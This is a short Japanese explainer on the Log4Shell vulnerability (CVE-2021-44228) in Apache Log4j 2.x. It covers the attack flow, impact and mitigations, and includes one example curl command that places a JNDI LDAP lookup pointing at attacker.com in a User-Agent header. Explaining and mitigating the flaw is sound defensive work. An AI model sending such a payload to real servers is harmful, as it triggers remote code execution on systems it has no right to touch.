# Summary
**Log4Shell**（CVE-2021-44228）は、Apache Log4j 2.xの重大なリモートコード実行（RCE）脆弱性です。この脆弱性は、Log4jのログメッセージ内で任意のデータを処理する際にJNDI（Java Naming and Directory Interface）を介して外部リソースへの参照が可能になるため、攻撃者が悪意のあるコードを実行することを可能にします。

# 実行方法の例

以下の例では、脆弱なLog4jを使用しているアプリケーションに対して、User-Agentヘッダーに悪意のあるペイロードを挿入し、リモートコードを実行します。

- `curl -X GET http://victim-server.com -H 'User-Agent: ${jndi:ldap://attacker.com/a}'`

各部分の説明

• curl -X GET http://victim-server.com: 脆弱なサーバーに対してHTTP GETリクエストを送信します。
• -H 'User-Agent: ${jndi:ldap://attacker.com/a}': User-Agentヘッダーに悪意のあるJNDI Lookupを含むペイロードを設定します。attacker.comは攻撃者が制御しているLDAPサーバーです。

#### 攻撃の流れ

- `1.	脆弱なLog4jを使用しているサーバーが、このリクエストを受け取ると、User-Agentヘッダーをログに記録しようとします`。
- `2.	Log4jは${jndi:ldap://attacker.com/a}という式を解釈し、JNDIを介して指定されたLDAPサーバーに接続します。`
- `3.	攻撃者が制御するLDAPサーバーが、悪意のあるJavaクラスをサーバーに返し、結果としてサーバー上で任意のコードが実行されます。`

#### 影響
Log4jを使用しているJavaアプリケーションが対象で、特にインターネットからログメッセージやユーザー入力を受け取るアプリケーションが影響を受けやすいです。

#### 対策
- Log4jのバージョンを2.16.0以降にアップデートする。
- JNDIの機能を無効化する設定を行う（`log4j2.formatMsgNoLookups`を`true`に設定するなど）。
この脆弱性は、広範囲にわたる影響を及ぼし、特にサーバーやクラウド環境で運用されている多くのJavaアプリケーションに影響を与えました。

